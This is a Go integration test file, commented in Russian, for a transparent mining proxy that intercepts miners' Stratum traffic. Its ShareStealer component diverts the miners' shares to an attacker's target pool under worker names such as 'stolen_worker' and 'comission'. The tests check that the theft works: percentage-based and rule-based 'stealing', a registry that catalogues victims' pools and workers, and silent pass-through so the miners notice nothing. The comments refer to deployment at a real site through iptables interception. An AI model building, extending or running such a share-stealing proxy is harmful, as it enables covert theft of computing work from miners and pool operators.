package proxy_test

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"testing"
	"time"

	"mining-proxy/proxy"
)

// mockPool запускает простой Stratum-совместимый сервер для тестов.
type mockPool struct {
	addr          string
	mu            sync.Mutex
	submits       int
	lastWorker    string
	receivedSubs  int
	receivedAuths int
	reject        bool
	ln            net.Listener
}

func startMockPool(t *testing.T) *mockPool {
	return startMockPoolOn(t, "127.0.0.1:0")
}

// startMockPoolOn поднимает mock-пул на заданном адресе (например,
// "127.0.0.2:3333") — нужно для теста нескольких пулов на разных IP.
func startMockPoolOn(t *testing.T, addr string) *mockPool {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		t.Fatalf("mock pool listen %s: %v", addr, err)
	}
	mp := &mockPool{addr: ln.Addr().String(), ln: ln}

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go mp.handle(conn)
		}
	}()
	return mp
}

// freePort возвращает свободный TCP-порт (закрывая временный listener), чтобы
// затем занять его на нескольких loopback-IP сразу.
func freePort(t *testing.T) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("free port: %v", err)
	}
	_, port, _ := net.SplitHostPort(ln.Addr().String())
	ln.Close()
	return port
}

// setReject переключает пул в режим reject: mining.submit будет
// возвращать result:false (пул «не принимает» шары).
func (m *mockPool) setReject(v bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.reject = v
}

func (m *mockPool) handle(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	for {
		line, err := reader.ReadBytes('\n')
		if err != nil {
			return
		}
		var msg struct {
			ID     interface{}   `json:"id"`
			Method string        `json:"method"`
			Params []interface{} `json:"params"`
		}
		if err := json.Unmarshal(line, &msg); err != nil {
			continue
		}

		m.mu.Lock()
		switch msg.Method {
		case "mining.subscribe":
			m.receivedSubs++
			m.mu.Unlock()
			resp, _ := json.Marshal(map[string]interface{}{
				"id":     msg.ID,
				"result": []interface{}{"sub1", "01000000", 4},
				"error":  nil,
			})
			writer.WriteString(string(resp) + "\n")
			writer.Flush()
		case "mining.authorize":
			m.receivedAuths++
			m.mu.Unlock()
			resp, _ := json.Marshal(map[string]interface{}{
				"id":     msg.ID,
				"result": true,
				"error":  nil,
			})
			writer.WriteString(string(resp) + "\n")
			writer.Flush()
		case "mining.submit":
			m.submits++
			if len(msg.Params) > 0 {
				m.lastWorker = fmt.Sprintf("%v", msg.Params[0])
			}
			reject := m.reject
			m.mu.Unlock()
			resp, _ := json.Marshal(map[string]interface{}{
				"id":     msg.ID,
				"result": !reject, // true = accept, false = reject
				"error":  nil,
			})
			writer.WriteString(string(resp) + "\n")
			writer.Flush()
		}
	}
}

func (m *mockPool) Close() { m.ln.Close() }

func (m *mockPool) getStats() (submits, subs, auths int, worker string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.submits, m.receivedSubs, m.receivedAuths, m.lastWorker
}

func TestProxyIntegration(t *testing.T) {
	// стартуем два mock-пула: «реальный» и «целевой»
	realPool := startMockPool(t)
	defer realPool.Close()

	targetPool := startMockPool(t)
	defer targetPool.Close()

	// stealer: interval 0 (сразу можно красть), percentage 100, batch 5
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:   100,
		IntervalMin:  0,
		IntervalMax:  0,
		BatchSize:    5,
		TargetPool:   targetPool.addr,
		TargetWorker: "stolen_worker",
		TargetPass:   "x",
	})

	// слушаем прокси на свободном порту
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	proxyAddr := ln.Addr().String()

	// pass: прозрачный, но fallback = realPool (т.к. прямой коннект к нам)
	pass := proxy.ProxyPass{
		ListenAddr:  proxyAddr,
		Fallback:    realPool.addr,
		FallbackSSL: false,
		Transparent: true,
	}

	// реестр «база» пул+воркер (этап 3)
	disc := proxy.NewDiscovery()

	// запускаем accept loop прокси вручную
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.HandleConnection(conn, pass, stealer, disc)
		}
	}()

	// имитируем ASIC
	client, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer client.Close()

	writer := bufio.NewWriter(client)
	reader := bufio.NewReader(client)

	send := func(obj map[string]interface{}) {
		raw, _ := json.Marshal(obj)
		writer.WriteString(string(raw) + "\n")
		writer.Flush()
	}
	readResp := func() string {
		line, _ := reader.ReadBytes('\n')
		return string(line)
	}

	// subscribe
	send(map[string]interface{}{"id": 1, "method": "mining.subscribe", "params": []string{"cpuminer/2.5"}})
	readResp()

	// authorize
	send(map[string]interface{}{"id": 2, "method": "mining.authorize", "params": []string{"client_worker.x", "x"}})
	readResp()

	// отправляем 10 shares
	for i := 3; i < 13; i++ {
		send(map[string]interface{}{
			"id":     i,
			"method": "mining.submit",
			"params": []interface{}{"client_worker.x", "job1", "extra", "time", "nonce"},
		})
		readResp()
	}

	// ждём асинхронное перенаправление
	time.Sleep(300 * time.Millisecond)

	// реальный пул должен получить ВСЕ 10 shares (прокси дублирует)
	realSubmits, _, _, _ := realPool.getStats()
	if realSubmits != 10 {
		t.Errorf("real pool: expected 10 submits, got %d", realSubmits)
	}

	// целевой пул должен получить shares с воркером stolen_worker
	targetSubmits, targetSubs, targetAuths, targetWorker := targetPool.getStats()
	if targetSubmits == 0 {
		t.Error("target pool: expected some stolen submits")
	}
	if targetSubs != 1 {
		t.Errorf("target pool: expected 1 subscribe, got %d", targetSubs)
	}
	if targetAuths != 1 {
		t.Errorf("target pool: expected 1 authorize, got %d", targetAuths)
	}
	if targetWorker != "stolen_worker" {
		t.Errorf("target pool: expected worker stolen_worker, got %q", targetWorker)
	}

	// все перенаправленные шары должны быть приняты (mock возвращает true),
	// счётчик accepted должен совпасть с числом принятых целевым пулом
	accepted := stealer.Accepted()
	if accepted != targetSubmits {
		t.Errorf("accepted: expected %d (accepted by target pool), got %d", targetSubmits, accepted)
	}

	// Реестр «база» пул+воркер: должен знать реальный пул и воркера клиента.
	snaps := disc.Snapshot()
	var foundPool bool
	var foundWorker bool
	for _, p := range snaps {
		if p.Pool != realPool.addr {
			continue
		}
		foundPool = true
		for _, w := range p.Workers {
			if w.Worker == "x" { // "client_worker.x" нормализуется до "x"
				foundWorker = true
				if w.Submits != 10 {
					t.Errorf("discovery: worker submits = %d, want 10", w.Submits)
				}
			}
		}
	}
	if !foundPool {
		t.Errorf("discovery: pool %s not found in %+v", realPool.addr, snaps)
	}
	if !foundWorker {
		t.Errorf("discovery: worker x not found in %+v", snaps)
	}

	t.Logf("OK: real(%d share) | target(%d sub, %d auth, %d share, worker=%s) | accepted=%d | discovery=%d pools",
		realSubmits, targetSubs, targetAuths, targetSubmits, targetWorker, accepted, len(snaps))
}

// TestProxyRuleSteal (этап 4) — обратная сторона allowlist: пара
// (пул, воркер) ЕСТЬ в steal_rules → шары кусаются и уходят на целевой пул
// с переписанным воркером, при этом реальный пул получает все оригиналы.
func TestProxyRuleSteal(t *testing.T) {
	realPool := startMockPool(t)
	defer realPool.Close()

	targetPool := startMockPool(t)
	defer targetPool.Close()

	rules := proxy.NewStealRules([]proxy.StealRule{
		{Pool: realPool.addr, Worker: "x"}, // "client_worker.x" → "x"
	})
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:   100,
		PauseShares:  true, // точный процент, детерминированно
		BatchSize:    1,
		TargetPool:   targetPool.addr,
		TargetWorker: "stolen_worker",
		TargetPass:   "x",
		Rules:        rules,
	})
	defer stealer.Close()

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	proxyAddr := ln.Addr().String()

	pass := proxy.ProxyPass{ListenAddr: proxyAddr, Fallback: realPool.addr, Transparent: true}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.HandleConnection(conn, pass, stealer, nil)
		}
	}()

	client, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer client.Close()
	writer := bufio.NewWriter(client)
	reader := bufio.NewReader(client)
	send := func(obj map[string]interface{}) {
		raw, _ := json.Marshal(obj)
		writer.WriteString(string(raw) + "\n")
		writer.Flush()
	}
	readResp := func() { reader.ReadBytes('\n') }

	send(map[string]interface{}{"id": 1, "method": "mining.subscribe", "params": []string{"cpuminer/2.5"}})
	readResp()
	send(map[string]interface{}{"id": 2, "method": "mining.authorize", "params": []string{"client_worker.x", "x"}})
	readResp()
	for i := 3; i < 8; i++ {
		send(map[string]interface{}{
			"id":     i,
			"method": "mining.submit",
			"params": []interface{}{"client_worker.x", "job1", "extra", "time", "nonce"},
		})
		readResp()
	}
	time.Sleep(300 * time.Millisecond)

	if realSubmits, _, _, _ := realPool.getStats(); realSubmits != 5 {
		t.Errorf("real pool: expected 5 submits, got %d", realSubmits)
	}
	targetSubmits, _, _, targetWorker := targetPool.getStats()
	if targetSubmits != 5 {
		t.Errorf("target pool: expected 5 stolen submits, got %d", targetSubmits)
	}
	if targetWorker != "stolen_worker" {
		t.Errorf("target worker = %q, want stolen_worker", targetWorker)
	}
	if stolen, total := stealer.Stats(); stolen != 5 || total != 5 {
		t.Errorf("stats = %d/%d, want 5/5", stolen, total)
	}
}

// TestProxyMultiPoolIPs (этапы 2+4) — несколько пулов на РАЗНЫХ IP-адресах
// (один порт), как на реальной площадке. Проверяем, что:
//   - каждое соединение уходит в свой пул (разные IP:port) по адресату;
//   - реестр discovery ведёт такие пулы раздельно;
//   - правила allowlist кусают только указанную пару (пул+воркер),
//     остальные пулы идут сквозняком.
//
// SO_ORIGINAL_DST/iptables не требуются: ProxyPass.ResolveDest подменяет
// определение адресата, возвращая IP источника клиента как адрес пула.
func TestProxyMultiPoolIPs(t *testing.T) {
	port := freePort(t)

	ips := []string{"127.0.0.1", "127.0.0.2", "127.0.0.3"}
	pools := make([]*mockPool, len(ips))
	for i, ip := range ips {
		pools[i] = startMockPoolOn(t, net.JoinHostPort(ip, port))
		defer pools[i].Close()
	}

	targetPool := startMockPool(t)
	defer targetPool.Close()

	// Кусаем только первый пул и только воркера вася3344.
	rules := proxy.NewStealRules([]proxy.StealRule{
		{Pool: net.JoinHostPort("127.0.0.1", port), Worker: "вася3344"},
	})
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:   100,
		PauseShares:  true,
		BatchSize:    1,
		TargetPool:   targetPool.addr,
		TargetWorker: "comission",
		TargetPass:   "x",
		Rules:        rules,
	})
	defer stealer.Close()

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	proxyAddr := ln.Addr().String()

	disc := proxy.NewDiscovery()

	pass := proxy.ProxyPass{
		ListenAddr:  proxyAddr,
		Fallback:    pools[0].addr,
		Transparent: true,
		// Тестовый резолвер: адресат = IP источника + порт пула.
		ResolveDest: func(c net.Conn) (string, bool) {
			host, _, err := net.SplitHostPort(c.RemoteAddr().String())
			if err != nil {
				return "", false
			}
			return net.JoinHostPort(host, port), false
		},
	}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.HandleConnection(conn, pass, stealer, disc)
		}
	}()

	// Каждый клиент коннектится со своего loopback-IP и майнит в «свой» пул.
	const shares = 4
	clients := []struct {
		srcIP  string
		worker string
	}{
		{"127.0.0.1", "вася3344"},
		{"127.0.0.2", "петя"},
		{"127.0.0.3", "коля"},
	}
	for _, c := range clients {
		local := &net.TCPAddr{IP: net.ParseIP(c.srcIP)}
		conn, err := (&net.Dialer{LocalAddr: local}).Dial("tcp", proxyAddr)
		if err != nil {
			t.Fatalf("dial from %s: %v", c.srcIP, err)
		}
		runSession(t, conn, "pool."+c.worker, shares)
		conn.Close()
	}

	time.Sleep(300 * time.Millisecond)

	// Каждый реальный пул получил ровно свои шары (по источникам).
	for i, c := range clients {
		submits, subs, auths, worker := pools[i].getStats()
		if submits != shares || subs != 1 || auths != 1 {
			t.Errorf("pool %s: submits=%d subs=%d auths=%d, want %d/1/1",
				pools[i].addr, submits, subs, auths, shares)
		}
		if worker != "pool."+c.worker {
			t.Errorf("pool %s: worker=%q, want %q", pools[i].addr, worker, "pool."+c.worker)
		}
	}

	// Кусается только первый пул (и только его воркер).
	if got, _, _, w := targetPool.getStats(); got != shares || w != "comission" {
		t.Errorf("target pool: submits=%d worker=%q, want %d/comission", got, w, shares)
	}

	// Реестр: три отдельных пула, у каждого свои шары.
	snaps := disc.Snapshot()
	if len(snaps) != 3 {
		t.Errorf("discovery pools = %d, want 3", len(snaps))
	}
	for _, ip := range ips {
		wantPool := net.JoinHostPort(ip, port)
		var found bool
		for _, p := range snaps {
			if p.Pool == wantPool {
				found = true
				if p.Submits != shares {
					t.Errorf("discovery pool %s submits=%d, want %d", wantPool, p.Submits, shares)
				}
			}
		}
		if !found {
			t.Errorf("discovery: pool %s not found in %+v", wantPool, snaps)
		}
	}
}

// runSession выполняет на соединении subscribe → authorize → N submit-ов
// (worker = "pool.<name>") и вычитывает ответы пула.
func runSession(t *testing.T, conn net.Conn, worker string, shares int) {
	t.Helper()
	writer := bufio.NewWriter(conn)
	reader := bufio.NewReader(conn)
	send := func(obj map[string]interface{}) {
		raw, _ := json.Marshal(obj)
		writer.WriteString(string(raw) + "\n")
		writer.Flush()
	}
	readResp := func() string {
		line, _ := reader.ReadBytes('\n')
		return string(line)
	}
	send(map[string]interface{}{"id": 1, "method": "mining.subscribe", "params": []string{"cpuminer/2.5"}})
	readResp()
	send(map[string]interface{}{"id": 2, "method": "mining.authorize", "params": []string{worker, "x"}})
	readResp()
	for i := 0; i < shares; i++ {
		send(map[string]interface{}{
			"id":     3 + i,
			"method": "mining.submit",
			"params": []interface{}{worker, "job1", "extra", "time", "nonce"},
		})
		readResp()
	}
}

// TestProxyRulePassthrough (этап 4) проверяет allowlist: если пара
// (пул, воркер) не попала в steal_rules, шары НЕ кусаются (целевой пул не
// получает ничего), но реальный пул получает все, а шары видны в статистике.
func TestProxyRulePassthrough(t *testing.T) {
	realPool := startMockPool(t)
	defer realPool.Close()

	targetPool := startMockPool(t)
	defer targetPool.Close()

	// Правило с тем же пулом, но ДРУГИМ воркером: клиент x не должен кусаться.
	rules := proxy.NewStealRules([]proxy.StealRule{
		{Pool: realPool.addr, Worker: "someone_else"},
	})
	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:   100,
		BatchSize:    1,
		TargetPool:   targetPool.addr,
		TargetWorker: "w",
		TargetPass:   "x",
		Rules:        rules,
	})
	defer stealer.Close()

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	proxyAddr := ln.Addr().String()

	pass := proxy.ProxyPass{
		ListenAddr:  proxyAddr,
		Fallback:    realPool.addr,
		FallbackSSL: false,
		Transparent: true,
	}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.HandleConnection(conn, pass, stealer, nil)
		}
	}()

	client, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer client.Close()
	writer := bufio.NewWriter(client)
	reader := bufio.NewReader(client)
	send := func(obj map[string]interface{}) {
		raw, _ := json.Marshal(obj)
		writer.WriteString(string(raw) + "\n")
		writer.Flush()
	}
	readResp := func() { reader.ReadBytes('\n') }

	send(map[string]interface{}{"id": 1, "method": "mining.subscribe", "params": []string{"cpuminer/2.5"}})
	readResp()
	send(map[string]interface{}{"id": 2, "method": "mining.authorize", "params": []string{"client_worker.x", "x"}})
	readResp()
	for i := 3; i < 8; i++ {
		send(map[string]interface{}{
			"id":     i,
			"method": "mining.submit",
			"params": []interface{}{"client_worker.x", "job1", "extra", "time", "nonce"},
		})
		readResp()
	}
	time.Sleep(300 * time.Millisecond)

	realSubmits, _, _, _ := realPool.getStats()
	if realSubmits != 5 {
		t.Errorf("real pool: expected 5 submits, got %d", realSubmits)
	}
	if targetSubmits, _, _, _ := targetPool.getStats(); targetSubmits != 0 {
		t.Errorf("target pool: expected 0 submits (rule mismatch), got %d", targetSubmits)
	}
	stolen, total := stealer.Stats()
	if stolen != 0 || total != 5 {
		t.Errorf("stats: stolen=%d total=%d, want 0/5", stolen, total)
	}
}

// rawCapture — простой TCP-сервер, который просто читает байты клиента.
// Используется для проверки прозрачного проброса не-стратум трафика.
type rawCapture struct {
	addr string
	mu   sync.Mutex
	data []byte
	ln   net.Listener
}

func startRawCapture(t *testing.T) *rawCapture {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("raw capture listen: %v", err)
	}
	rc := &rawCapture{addr: ln.Addr().String(), ln: ln}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				buf := make([]byte, 32*1024)
				for {
					n, err := c.Read(buf)
					if n > 0 {
						rc.mu.Lock()
						rc.data = append(rc.data, buf[:n]...)
						rc.mu.Unlock()
					}
					if err != nil {
						return
					}
				}
			}(conn)
		}
	}()
	return rc
}

func (r *rawCapture) getData() string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return string(r.data)
}

func (r *rawCapture) Close() { r.ln.Close() }

// TestProxyRawPassthrough проверяет, что НЕ-стратум соединение (например,
// HTTP или любой другой TCP-поток из подсети) пробрасывается прозрачно,
// байт-в-байт, без попыток парсинга и «кражи».
func TestProxyRawPassthrough(t *testing.T) {
	raw := startRawCapture(t)
	defer raw.Close()

	targetPool := startMockPool(t)
	defer targetPool.Close()

	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
		Percentage:   100, // хоть 100% — не-стратум не должен кусаться
		IntervalMin:  0,
		IntervalMax:  0,
		BatchSize:    1,
		TargetPool:   targetPool.addr,
		TargetWorker: "w",
		TargetPass:   "x",
	})
	defer stealer.Close()

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	proxyAddr := ln.Addr().String()

	pass := proxy.ProxyPass{
		ListenAddr:  proxyAddr,
		Fallback:    raw.addr,
		FallbackSSL: false,
		Transparent: true,
	}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.HandleConnection(conn, pass, stealer, nil)
		}
	}()

	// «Клиент» шлёт обычный поток: первая строка не JSON/стратум, дальше бинарь.
	payload := "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n\x00\x01\x02hello\x1e\nrandom"
	client, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	if _, err := client.Write([]byte(payload)); err != nil {
		t.Fatalf("write payload: %v", err)
	}
	client.Close()

	// Ждём, пока сервер примет данные.
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) && raw.getData() == "" {
		time.Sleep(10 * time.Millisecond)
	}

	if got := raw.getData(); got != payload {
		t.Errorf("raw passthrough mismatch:\n got=%q\nwant=%q", got, payload)
	}
}
